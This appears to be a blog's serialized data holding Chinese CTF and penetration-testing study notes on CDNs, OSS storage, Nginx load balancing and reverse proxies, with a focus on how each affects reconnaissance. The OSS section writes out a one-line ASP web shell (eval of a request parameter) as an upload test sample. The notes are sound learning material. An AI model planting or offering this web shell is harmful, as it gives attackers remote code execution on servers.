申请并备案域名以后，进入CDN的页面，业务类型一般是选择“全站加速”，其他的有音频、视频、图片加速等\n 2. 加速区域选择“仅中国内地”、“全球”、“全球（不包含中国内地）”\n 3. 配置宝塔的域名绑定 47.122.22.195 -> www.zoro8.com，此时ping这个域名是不通的，因为没有做阿里云网站DNS配置上的域名绑定解析，需要加个www的主机记录\n 4. 然后在CDN的页面里，将刚才的 IP地址、端口加上，点下一步开通CDN\n 5. 然后需要等待几分钟的时间让他配置完成\n 6. 需要配置CNAME，将生成的www.zoro8.com.w.kunlunpi.com加到DNS解析里，主机名还是www\n 7. 上一步完成后会检测CNAME状态，生效后会显示“已配置”\n\n\n\n完成以上配置步骤后，我们再去ping这个域名www.zoro8.com，因为DNS解析时间不同的问题，视频演示中出现了没效果的情况。\n\n我们针对这种情况，可以使用【超级ping在线工具】完成超级ping，就是用全国多个区域去ping这个地址\n\n\n\n图中我们用这个工具试了一下ping百度，用到多个ip去ping这个地址，这里的响应ip各不相同，这就意思是用到了CDN加速，规则是就近规则。同样的，我们是用了一个ip地址来控制那个网站，但分配到了多个ip\n\n**结论：**我们在信息搜集的时候，针对域名进行搜集，如果有CDN加速的话，如果只搜集到其中某个ip，对这个ip进行渗透测试，就是测试错了地方，真实的网站根本不在那个ip上面，它只是一个节点。后面会有绕过CDN的课程，针对性的做信息搜集",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第45天\n\nweb架构&oss存储&负载均衡&cdn加速&反向代理&waf防护\n\n发现单纯学习ctf没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种ctf比赛，或者是每天练习ctf赛题，理论与实践相结合。\n\n\n\n * cdn\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第22章：基础入门-web架构&oss存储&负载均衡&cdn加速&反向代理&waf防护\n\n\n# cdn\n\n**现象：**外地访问，尤其是海外访问的时候，会出现访问太慢的情况，为了解决这个问题所以产生了cdn\n\n**原理：**内容分发服务，旨在提高网站访问速度，在cdn选择区域内分布多个节点，提高访问速度。比如选择全球，会在全球分布各种节点，如果我们开通一个cdn，真实地址是在湖北，如果在北京访问，会访问cdn北京节点。\n\n**举例：**就像百度等大厂会有cdn技术的应用，在全国乃至全球访问百度都不会有太大的速度差异。\n\n\n\n**影响：**隐藏了真实的ip地址，导致目标测试错误\n\n**演示：**windows2012+bt宝塔面板+cdn服务\n\n 1. 申请并备案域名以后，进入cdn的页面，业务类型一般是选择“全站加速”，其他的有音频、视频、图片加速等\n 2. 加速区域选择“仅中国内地”、“全球”、“全球（不包含中国内地）”\n 3. 配置宝塔的域名绑定 47.122.22.195 -> www.zoro8.com，此时ping这个域名是不通的，因为没有做阿里云网站dns配置上的域名绑定解析，需要加个www的主机记录\n 4. 然后在cdn的页面里，将刚才的 ip地址、端口加上，点下一步开通cdn\n 5. 然后需要等待几分钟的时间让他配置完成\n 6. 需要配置cname，将生成的www.zoro8.com.w.kunlunpi.com加到dns解析里，主机名还是www\n 7. 上一步完成后会检测cname状态，生效后会显示“已配置”\n\n\n\n完成以上配置步骤后，我们再去ping这个域名www.zoro8.com，因为dns解析时间不同的问题，视频演示中出现了没效果的情况。\n\n我们针对这种情况，可以使用【超级ping在线工具】完成超级ping，就是用全国多个区域去ping这个地址\n\n\n\n图中我们用这个工具试了一下ping百度，用到多个ip去ping这个地址，这里的响应ip各不相同，这就意思是用到了cdn加速，规则是就近规则。同样的，我们是用了一个ip地址来控制那个网站，但分配到了多个ip\n\n**结论：**我们在信息搜集的时候，针对域名进行搜集，如果有cdn加速的话，如果只搜集到其中某个ip，对这个ip进行渗透测试，就是测试错了地方，真实的网站根本不在那个ip上面，它只是一个节点。后面会有绕过cdn的课程，针对性的做信息搜集",charsets:{cjk:!0},lastUpdated:"2025/01/09, 22:57:46",lastUpdatedTimestamp:1736434666e3},{title:"20250103CTF学习笔记30",frontmatter:{title:"20250103CTF学习笔记30",date:"2025-01-03T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2025-01-03-CTFLearn.html",relativePath:"views/numerology/2025-01-03-CTFLearn.md",key:"v-6d046982",path:"/views/numerology/2025-01-03-CTFLearn.html",headers:[{level:2,title:"OSS对象存储",slug:"oss对象存储",normalizedTitle:"oss对象存储",charIndex:169}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第46天</p>\n<p>Web架构&amp;OSS存储&amp;负载均衡&amp;CDN加速&amp;反向代理&amp;WAF防护</p>\n<p>发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。</p>\n<p>此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>小迪安全视频地址【<RouterLink to="/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/">🔗传送门</RouterLink>】</li>\n</ul>\n',headersStr:"OSS对象存储",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第46天\n\nWeb架构&OSS存储&负载均衡&CDN加速&反向代理&WAF防护\n\n发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。\n\n\n\n * OSS对象存储\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第22章：基础入门-Web架构&OSS存储&负载均衡&CDN加速&反向代理&WAF防护\n\n\n# OSS对象存储\n\n**原理：**云存储服务，旨在提高访问速度\n\n影响：\n\n演示：【Cloudreve网盘服务】\n\nWindows2012 + cloudreve + 阿里云OSS（这时候不需要IIS来管理了）\n\n视频中演示的这个cloudreve的web应用是直接可以下载exe版的，双加exe文件即可执行，就能启动服务\n\n\n\n启动完成后，会随机生成用户名和密码，然后会占用5212端口\n\n\n\n图中这个应用是一个网盘应用，如果我们上传图片的话，直接将图片拖到网站中，就能上传到服务器中。\n\n我们修改一下这个应用的配置，在管理面板上选择存储策略，选择存储方式\n\n\n\n按着Cloudreve提示的步骤配置完OSS对象存储后，再加一个用户组的存储策略，让当前账号存到OSS\n\n此时重新上传文件到网盘，就能将文件传到OSS对象存储了",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第46天\n\nweb架构&oss存储&负载均衡&cdn加速&反向代理&waf防护\n\n发现单纯学习ctf没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种ctf比赛，或者是每天练习ctf赛题，理论与实践相结合。\n\n\n\n * oss对象存储\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第22章：基础入门-web架构&oss存储&负载均衡&cdn加速&反向代理&waf防护\n\n\n# oss对象存储\n\n**原理：**云存储服务，旨在提高访问速度\n\n影响：\n\n演示：【cloudreve网盘服务】\n\nwindows2012 + cloudreve + 阿里云oss（这时候不需要iis来管理了）\n\n视频中演示的这个cloudreve的web应用是直接可以下载exe版的，双加exe文件即可执行，就能启动服务\n\n\n\n启动完成后，会随机生成用户名和密码，然后会占用5212端口\n\n\n\n图中这个应用是一个网盘应用，如果我们上传图片的话，直接将图片拖到网站中，就能上传到服务器中。\n\n我们修改一下这个应用的配置，在管理面板上选择存储策略，选择存储方式\n\n\n\n按着cloudreve提示的步骤配置完oss对象存储后，再加一个用户组的存储策略，让当前账号存到oss\n\n此时重新上传文件到网盘，就能将文件传到oss对象存储了",charsets:{cjk:!0},lastUpdated:"2025/01/09, 22:57:46",lastUpdatedTimestamp:1736434666e3},{title:"20250105CTF学习笔记32",frontmatter:{title:"20250105CTF学习笔记32",date:"2025-01-05T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2025-01-05-CTFLearn.html",relativePath:"views/numerology/2025-01-05-CTFLearn.md",key:"v-7363e886",path:"/views/numerology/2025-01-05-CTFLearn.html",headers:[{level:2,title:"负载均衡",slug:"负载均衡",normalizedTitle:"负载均衡",charIndex:60},{level:3,title:"原理：",slug:"原理",normalizedTitle:"原理：",charIndex:98},{level:3,title:"影响：",slug:"影响",normalizedTitle:"影响：",charIndex:107},{level:3,title:"演示：",slug:"演示",normalizedTitle:"演示：",charIndex:116},{level:3,title:"结论：",slug:"结论",normalizedTitle:"结论：",charIndex:125},{level:2,title:"思维导图",slug:"思维导图",normalizedTitle:"思维导图",charIndex:132}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第48天</p>\n<p>今日内容：基础入门-Web架构&amp;OSS存储&amp;负载均衡&amp;CDN加速&amp;反向代理&amp;WAF防护</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>小迪安全视频地址【<RouterLink to="/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/">🔗传送门</RouterLink>】</li>\n</ul>\n',headersStr:"负载均衡 原理： 影响： 演示： 结论： 思维导图",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第48天\n\n今日内容：基础入门-Web架构&OSS存储&负载均衡&CDN加速&反向代理&WAF防护\n\n\n\n * 负载均衡\n   * 原理：\n   * 影响：\n   * 演示：\n   * 结论：\n * 思维导图\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第22章：基础入门-Web架构&OSS存储&负载均衡&CDN加速&反向代理&WAF防护\n\n\n# 负载均衡\n\n\n# 原理：\n\n分摊到多个操作单元上执行，共同完成工作任务\n\n\n\n用CDN这个图也能解释负载均衡，能提高访问速度，提高速度，还有一个功能是容灾。\n\n\n# 影响：\n\n有多个服务加载服务，测试过程中存在多个目标情况\n\n\n# 演示：\n\nNginx负载均衡配置\n\nWindows2012+BT宝塔面板+Nginx\n\n * 在宝塔面板中，我们点击站点的设置，选择配置文件，修改一下内容\n\n * # 定义负载设置 以下内容要放到最外一层\n   upstream fzjh{\n   \tserver 47.94.236.117:80 weight=2;\n       server 47.122.22.195:80 weight=1;\n   }\n   server {\n   \tlisten 80;\n       #\n       #定义访问路径 访问策略\n       # /意思是访问根路径的时候启动负载均衡\n       location / {\n           proxy_pass http://fzjh/;\n       }    \n   }\n   \n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   \n\n * 最终出现的效果是，每次刷新，有时候显示47.94.236.117:80的页面，有时候显示47.122.22.195:80的页面。\n\n * 可以加上权重，优先权重大的显示。\n\n * 我们可以将相同的站点部署到多个ip上边，其中一台服务器坏了也不要紧，我们还有其他的服务器。\n\n\n# 结论：\n\n讲了这么多的搭建方式，用不同的技术搭建的网站， 最后信息搜集的时候，我们需要明确是用什么技术做的应用，比如OSS对象存储就将文件上传漏洞解决了。这是在为后来的信息搜集打基础。\n\n\n# 思维导图\n\n",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第48天\n\n今日内容：基础入门-web架构&oss存储&负载均衡&cdn加速&反向代理&waf防护\n\n\n\n * 负载均衡\n   * 原理：\n   * 影响：\n   * 演示：\n   * 结论：\n * 思维导图\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第22章：基础入门-web架构&oss存储&负载均衡&cdn加速&反向代理&waf防护\n\n\n# 负载均衡\n\n\n# 原理：\n\n分摊到多个操作单元上执行，共同完成工作任务\n\n\n\n用cdn这个图也能解释负载均衡，能提高访问速度，提高速度，还有一个功能是容灾。\n\n\n# 影响：\n\n有多个服务加载服务，测试过程中存在多个目标情况\n\n\n# 演示：\n\nnginx负载均衡配置\n\nwindows2012+bt宝塔面板+nginx\n\n * 在宝塔面板中，我们点击站点的设置，选择配置文件，修改一下内容\n\n * # 定义负载设置 以下内容要放到最外一层\n   upstream fzjh{\n   \tserver 47.94.236.117:80 weight=2;\n       server 47.122.22.195:80 weight=1;\n   }\n   server {\n   \tlisten 80;\n       #\n       #定义访问路径 访问策略\n       # /意思是访问根路径的时候启动负载均衡\n       location / {\n           proxy_pass http://fzjh/;\n       }    \n   }\n   \n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   \n\n * 最终出现的效果是，每次刷新，有时候显示47.94.236.117:80的页面，有时候显示47.122.22.195:80的页面。\n\n * 可以加上权重，优先权重大的显示。\n\n * 我们可以将相同的站点部署到多个ip上边，其中一台服务器坏了也不要紧，我们还有其他的服务器。\n\n\n# 结论：\n\n讲了这么多的搭建方式，用不同的技术搭建的网站， 最后信息搜集的时候，我们需要明确是用什么技术做的应用，比如oss对象存储就将文件上传漏洞解决了。这是在为后来的信息搜集打基础。\n\n\n# 思维导图\n\n",charsets:{cjk:!0},lastUpdated:"2025/01/09, 22:57:46",lastUpdatedTimestamp:1736434666e3},{title:"20250104CTF学习笔记31",frontmatter:{title:"20250104CTF学习笔记31",date:"2025-01-04T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2025-01-04-CTFLearn.html",relativePath:"views/numerology/2025-01-04-CTFLearn.md",key:"v-1f97adf8",path:"/views/numerology/2025-01-04-CTFLearn.html",headers:[{level:2,title:"OSS对象存储",slug:"oss对象存储",normalizedTitle:"oss对象存储",charIndex:169},{level:2,title:"反向代理",slug:"反向代理",normalizedTitle:"反向代理",charIndex:61},{level:3,title:"正向连接",slug:"正向连接",normalizedTitle:"正向连接",charIndex:190},{level:3,title:"转发流量",slug:"转发流量",normalizedTitle:"转发流量",charIndex:200},{level:3,title:"正向代理",slug:"正向代理",normalizedTitle:"正向代理",charIndex:210},{level:3,title:"反向代理",slug:"反向代理-2",normalizedTitle:"反向代理",charIndex:61},{level:3,title:"透明代理",slug:"透明代理",normalizedTitle:"透明代理",charIndex:230},{level:3,title:"Socks 代理",slug:"socks-代理",normalizedTitle:"socks 代理",charIndex:240},{level:3,title:"端口转发",slug:"端口转发",normalizedTitle:"端口转发",charIndex:254},{level:3,title:"端口映射",slug:"端口映射",normalizedTitle:"端口映射",charIndex:264}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第47天</p>\n<p>Web架构&amp;OSS存储&amp;负载均衡&amp;CDN加速&amp;反向代理&amp;WAF防护</p>\n<p>发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。</p>\n<p>此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>小迪安全视频地址【<RouterLink to="/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/">🔗传送门</RouterLink>】</li>\n</ul>\n',headersStr:"OSS对象存储 反向代理 正向连接 转发流量 正向代理 反向代理 透明代理 Socks 代理 端口转发 端口映射",content:'从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第47天\n\nWeb架构&OSS存储&负载均衡&CDN加速&反向代理&WAF防护\n\n发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。\n\n\n\n * OSS对象存储\n * 反向代理\n   * 正向连接\n   * 转发流量\n   * 正向代理\n   * 反向代理\n   * 透明代理\n   * Socks 代理\n   * 端口转发\n   * 端口映射\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第22章：基础入门-Web架构&OSS存储&负载均衡&CDN加速&反向代理&WAF防护\n\n\n# OSS对象存储\n\n> 发现有很多人都在跟小迪的这套课程，在CSDN找到了一位师傅【今天是 几号】就是学的这套课程，甚至还在听课后做了复现，这种学习效率真的让人惊叹\n\n书接上回:\n\n我们这次上传木马1.asp的木马，木马内容是\n\n<%eval request("pass")%>\n\n\n1\n\n\n这时候发现这个Web应用无法上传木马，实际上我们想讲的是即使上传成功以后\n\n我们去访问阿里云OSS对象存储里，这个文件的详情页，有个URL地址，是互联网环境的访问地址。\n\n在访问的时候发现，就算是访问这个后门地址也没有什么用，完全不解析，只是浏览。\n\n**原理：**为什么要使用第三方存储\n\n 1. 静态文件会占用大量带宽\n 2. 加载速度\n 3. 存储空间\n\n**影响：**上传的文件或解析的文件均来自OSS资源，无法解析，单独存储\n\n 1. 修复上传安全漏洞\n 2. 文件解析不一样\n 3. 但AccessKey隐患\n\n**换位思考：**用这种方法一定程度解决了上传漏洞\n\n**隐患：**AccessKey是云上服务的密钥或者说账号，通过这个密钥，可以控制当前阿里云账户开放的服务器或应用\n\n\n\n\n# 反向代理\n\n定义：\n\n * 正向代理为客户端服务，客户端主动代理访问目标（不代理不可达）\n * 反向代理为服务端服务，服务端主动转发数据给访问地址（不主动不可达）\n\n\n\n上图是正向代理图，下图是反向代理图\n\n\n\n理解：\n\n * 比如国外代理就是正向代理，就是自己主动的找别人的让别人带出去的。\n * 反向代理是服务器A把流量给到另一个服务器B上，我们是可以可以访问服务器B的，无法访问服务器A的，是服务器A主动把流量给到了服务器B上，通过访问服务器B，我们可以间接的访问服务器A。\n\n**反向代理影响：**访问目标只是一个代理，非真实应用服务器\n\n**演示：**Nginx反向代理配置\n\nWindows2012+BT宝塔面板+Nginx\n\n * 视频中，需要特别注意的是我们每添加一个站点，比如添加的xiaodi.zero8.com，就需要在阿里云的DNS解析中将这个地址加到解析记录里去\n * 在宝塔面板直接对这个站点改一下“设置”-“反向代理”，视频中演示的是设置了一个www.baidu.com的反向代理\n * 在访问后xiaodi.zero8.com，会直接跳转到www.baidu.com的页面，但是地址栏还是xiaodi.zero8.com\n\n结论：\n\n * 如果做了反向代理，如果这时候做渗透测试，我们测试的就是百度了，和网站自身没有关系。\n * 通俗来说，就是将真实网站指向任何一个地方，访问起来就是别人的东西了\n\n**注意：**正向代理和反向代理都是解决访问不可达的问题，但由于反向代理多出一个可以重定向解析的功能操作，导致反向代理出的站点指向和正式应用毫无关系！正向代理对服务器的渗透测试没有影响，是因为是在客户端在操作，对别人的服务器没有影响\n\n**挖坑：**现阶段只要知道这个情况就行了，后续课程会针对这个反向代理的不同之处的影响和判定做解释\n\n**拓展：**反向代理和流量跳转有什么区别？\n\n> 正向连接、转发流量、正向代理、反向代理的区别如下：\n> \n> \n> # 正向连接\n> \n>  * 定义：指客户端主动向目标服务器发起的直接连接，是一种最基本的网络连接方式，客户端直接与目标服务器建立通信链路，发送请求并接收响应1。\n>  * 特点：是网络通信的基础方式，通常是一对一的连接，连接建立后数据直接在客户端和目标服务器之间传输，不涉及中间服务器的额外处理。\n>  * 应用场景：如用户直接访问网站、发送邮件等日常网络活动大多基于正向连接。\n> \n> \n> # 转发流量\n> \n>  * 定义：通常指将网络流量从一个网络位置引导至另一个网络位置，这个过程可能是通过修改域名解析、劫持网络连接或者在网页中设置跳转链接等方式来实现1。\n>  * 特点：转发流量的实现方式较为多样，并不一定依赖特定的服务器架构，且在很多情况下可能是非法或未经授权的行为。\n>  * 应用场景：合法的流量转发可用于网络优化、负载均衡等，如将用户对网站的访问流量引导到不同的数据中心以平衡负载；非法的流量转发常被用于流量劫持等恶意行为，如黑客通过 DNS 劫持、ARP 欺骗等手段实现流量转发，将用户引导至钓鱼网站或恶意软件下载页面等。\n> \n> \n> # 正向代理\n> \n>  * 定义：是位于客户端和目标服务器之间的代理服务器，客户端需明确配置代理服务器的地址和端口等信息，将请求发送给代理服务器，代理服务器再转发给目标服务器，并将目标服务器的响应返回给客户端14。\n>  * 特点：主要服务于客户端，客户端知道代理服务器的存在并主动进行配置，而目标服务器通常不知道客户端的真实身份和地址，只看到代理服务器的请求。\n>  * 应用场景：常用于突破网络访问限制，如访问国外网站、突破企业或学校内部网络的限制等，也可用于提高访问速度、隐藏客户端真实 IP 地址以保护隐私、进行网络监控和流量管理等1。\n> \n> \n> # 反向代理\n> \n>  * 定义：位于目标服务器和客户端之间，客户端向反向代理服务器发送请求，无需指定目标服务器，反向代理服务器根据策略自行选择后端的目标服务器，将请求转发给目标服务器，并把从目标服务器获取的结果返回给客户端13。\n>  * 特点：主要服务于后端服务器，客户端通常不知道反向代理服务器的存在，以为自己直接访问的是目标服务器，而后端服务器知道请求来自反向代理服务器。\n>  * 应用场景：广泛应用于服务器集群中，实现负载均衡和高可用性，如大型网站、电商平台、云计算平台等，还可用于缓存加速、SSL 加密卸载、安全防护等，提高系统的性能和安全性1。\n> \n> 与上述概念类似的有：\n> \n> \n> # 透明代理\n> \n> 对客户端和服务器端来说都是透明的，客户端不需要进行任何特殊配置，服务器也不知道代理的存在。透明代理通常用于监控和过滤流量，如企业内部网络中，可对员工的网络访问进行监控和管理，根据预设规则过滤掉不安全或不适当的内容79。\n> \n> \n> # Socks 代理\n> \n> 工作在会话层，不要求应用程序遵循特定的操作系统平台，可代理任何基于 TCP/IP 协议的应用，支持 TCP 和 UDP 协议，比 HTTP 代理更通用和灵活，通常用于通过 VPN 或 Tor 网络进行匿名访问、访问被限制的网络应用程序等。\n> \n> \n> # 端口转发\n> \n> 是一种将网络流量从一个端口转发到另一个端口的技术。它可以用于在网络中的不同设备之间建立通信通道，常用于内网穿透、代理服务器、负载均衡等场景，可通过路由器、交换机或软件实现5。\n> \n> \n> # 端口映射\n> \n> 是一种网络地址转换技术，通过在路由器或防火墙上设置映射规则，将公网 IP 的特定端口映射到内网的指定设备和端口上，主要用于服务发布、游戏联机等场景5。',normalizedContent:'从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第47天\n\nweb架构&oss存储&负载均衡&cdn加速&反向代理&waf防护\n\n发现单纯学习ctf没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种ctf比赛，或者是每天练习ctf赛题，理论与实践相结合。\n\n\n\n * oss对象存储\n * 反向代理\n   * 正向连接\n   * 转发流量\n   * 正向代理\n   * 反向代理\n   * 透明代理\n   * socks 代理\n   * 端口转发\n   * 端口映射\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第22章：基础入门-web架构&oss存储&负载均衡&cdn加速&反向代理&waf防护\n\n\n# oss对象存储\n\n> 发现有很多人都在跟小迪的这套课程，在csdn找到了一位师傅【今天是 几号】就是学的这套课程，甚至还在听课后做了复现，这种学习效率真的让人惊叹\n\n书接上回:\n\n我们这次上传木马1.asp的木马，木马内容是\n\n<%eval request("pass")%>\n\n\n1\n\n\n这时候发现这个web应用无法上传木马，实际上我们想讲的是即使上传成功以后\n\n我们去访问阿里云oss对象存储里，这个文件的详情页，有个url地址，是互联网环境的访问地址。\n\n在访问的时候发现，就算是访问这个后门地址也没有什么用，完全不解析，只是浏览。\n\n**原理：**为什么要使用第三方存储\n\n 1. 静态文件会占用大量带宽\n 2. 加载速度\n 3. 存储空间\n\n**影响：**上传的文件或解析的文件均来自oss资源，无法解析，单独存储\n\n 1. 修复上传安全漏洞\n 2. 文件解析不一样\n 3. 但accesskey隐患\n\n**换位思考：**用这种方法一定程度解决了上传漏洞\n\n**隐患：**accesskey是云上服务的密钥或者说账号，通过这个密钥，可以控制当前阿里云账户开放的服务器或应用\n\n\n\n\n# 反向代理\n\n定义：\n\n * 正向代理为客户端服务，客户端主动代理访问目标（不代理不可达）\n * 反向代理为服务端服务，服务端主动转发数据给访问地址（不主动不可达）\n\n\n\n上图是正向代理图，下图是反向代理图\n\n\n\n理解：\n\n * 比如国外代理就是正向代理，就是自己主动的找别人的让别人带出去的。\n * 反向代理是服务器a把流量给到另一个服务器b上，我们是可以可以访问服务器b的，无法访问服务器a的，是服务器a主动把流量给到了服务器b上，通过访问服务器b，我们可以间接的访问服务器a。\n\n**反向代理影响：**访问目标只是一个代理，非真实应用服务器\n\n**演示：**nginx反向代理配置\n\nwindows2012+bt宝塔面板+nginx\n\n * 视频中，需要特别注意的是我们每添加一个站点，比如添加的xiaodi.zero8.com，就需要在阿里云的dns解析中将这个地址加到解析记录里去\n * 在宝塔面板直接对这个站点改一下“设置”-“反向代理”，视频中演示的是设置了一个www.baidu.com的反向代理\n * 在访问后xiaodi.zero8.com，会直接跳转到www.baidu.com的页面，但是地址栏还是xiaodi.zero8.com\n\n结论：\n\n * 如果做了反向代理，如果这时候做渗透测试，我们测试的就是百度了，和网站自身没有关系。\n * 通俗来说，就是将真实网站指向任何一个地方，访问起来就是别人的东西了\n\n**注意：**正向代理和反向代理都是解决访问不可达的问题，但由于反向代理多出一个可以重定向解析的功能操作，导致反向代理出的站点指向和正式应用毫无关系！正向代理对服务器的渗透测试没有影响，是因为是在客户端在操作，对别人的服务器没有影响\n\n**挖坑：**现阶段只要知道这个情况就行了，后续课程会针对这个反向代理的不同之处的影响和判定做解释\n\n**拓展：**反向代理和流量跳转有什么区别？\n\n> 正向连接、转发流量、正向代理、反向代理的区别如下：\n> \n> \n> # 正向连接\n> \n>  * 定义：指客户端主动向目标服务器发起的直接连接，是一种最基本的网络连接方式，客户端直接与目标服务器建立通信链路，发送请求并接收响应1。\n>  * 特点：是网络通信的基础方式，通常是一对一的连接，连接建立后数据直接在客户端和目标服务器之间传输，不涉及中间服务器的额外处理。\n>  * 应用场景：如用户直接访问网站、发送邮件等日常网络活动大多基于正向连接。\n> \n> \n> # 转发流量\n> \n>  * 定义：通常指将网络流量从一个网络位置引导至另一个网络位置，这个过程可能是通过修改域名解析、劫持网络连接或者在网页中设置跳转链接等方式来实现1。\n>  * 特点：转发流量的实现方式较为多样，并不一定依赖特定的服务器架构，且在很多情况下可能是非法或未经授权的行为。\n>  * 应用场景：合法的流量转发可用于网络优化、负载均衡等，如将用户对网站的访问流量引导到不同的数据中心以平衡负载；非法的流量转发常被用于流量劫持等恶意行为，如黑客通过 dns 劫持、arp 欺骗等手段实现流量转发，将用户引导至钓鱼网站或恶意软件下载页面等。\n> \n> \n> # 正向代理\n> \n>  * 定义：是位于客户端和目标服务器之间的代理服务器，客户端需明确配置代理服务器的地址和端口等信息，将请求发送给代理服务器，代理服务器再转发给目标服务器，并将目标服务器的响应返回给客户端14。\n>  * 特点：主要服务于客户端，客户端知道代理服务器的存在并主动进行配置，而目标服务器通常不知道客户端的真实身份和地址，只看到代理服务器的请求。\n>  * 应用场景：常用于突破网络访问限制，如访问国外网站、突破企业或学校内部网络的限制等，也可用于提高访问速度、隐藏客户端真实 ip 地址以保护隐私、进行网络监控和流量管理等1。\n> \n> \n> # 反向代理\n> \n>  * 定义：位于目标服务器和客户端之间，客户端向反向代理服务器发送请求，无需指定目标服务器，反向代理服务器根据策略自行选择后端的目标服务器，将请求转发给目标服务器，并把从目标服务器获取的结果返回给客户端13。\n>  * 特点：主要服务于后端服务器，客户端通常不知道反向代理服务器的存在，以为自己直接访问的是目标服务器，而后端服务器知道请求来自反向代理服务器。\n>  * 应用场景：广泛应用于服务器集群中，实现负载均衡和高可用性，如大型网站、电商平台、云计算平台等，还可用于缓存加速、ssl 加密卸载、安全防护等，提高系统的性能和安全性1。\n> \n> 与上述概念类似的有：\n> \n> \n> # 透明代理\n> \n> 对客户端和服务器端来说都是透明的，客户端不需要进行任何特殊配置，服务器也不知道代理的存在。透明代理通常用于监控和过滤流量，如企业内部网络中，可对员工的网络访问进行监控和管理，根据预设规则过滤掉不安全或不适当的内容79。\n> \n> \n> # socks 代理\n> \n> 工作在会话层，不要求应用程序遵循特定的操作系统平台，可代理任何基于 tcp/ip 协议的应用，支持 tcp 和 udp 协议，比 http 代理更通用和灵活，通常用于通过 vpn 或 tor 网络进行匿名访问、访问被限制的网络应用程序等。\n> \n> \n> # 端口转发\n> \n> 是一种将网络流量从一个端口转发到另一个端口的技术。它可以用于在网络中的不同设备之间建立通信通道，常用于内网穿透、代理服务器、负载均衡等场景，可通过路由器、交换机或软件实现5。\n> \n> \n> # 端口映射\n> \n> 是一种网络地址转换技术，通过在路由器或防火墙上设置映射规则，将公网 ip 的特定端口映射到内网的指定设备和端口上，主要用于服务发布、游戏联机等场景5。',charsets:{cjk:!0},lastUpdated:"2025/01/09, 22:57:46",lastUpdatedTimestamp:1736434666e3},{title:"20250106CTF学习笔记33",frontmatter:{title:"20250106CTF学习笔记33",date:"2025-01-06T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2025-01-06-CTFLearn.html",relativePath:"views/numerology/2025-01-06-CTFLearn.md",key:"v-12d8aff0",path:"/views/numerology/2025-01-06-CTFLearn.html",headers:[{level:2,title:"原生开发",slug:"原生开发",normalizedTitle:"原生开发",charIndex:73},{level:2,title:"使用H5语言开发",slug:"使用h5语言开发",normalizedTitle:"使用h5语言开发",charIndex:100},{level:2,title:"使用flutter开发",slug:"使用flutter开发",normalizedTitle:"使用flutter开发",charIndex:112},{level:2,title:"常规Web开发",slug:"常规web开发",normalizedTitle:"常规web开发",charIndex:127},{level:3,title:"演示：",slug:"演示",normalizedTitle:"演示：",charIndex:140}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第49天</p>\n<p>今日内容：基础入门-APP架构&amp;小程序&amp;H5+Vue语言&amp;Web封装&amp;原生开发&amp;Flutter</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>小迪安全视频地址【<RouterLink to="/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/">🔗传送门</RouterLink>】</li>\n</ul>\n',headersStr:"原生开发 使用H5语言开发 使用flutter开发 常规Web开发 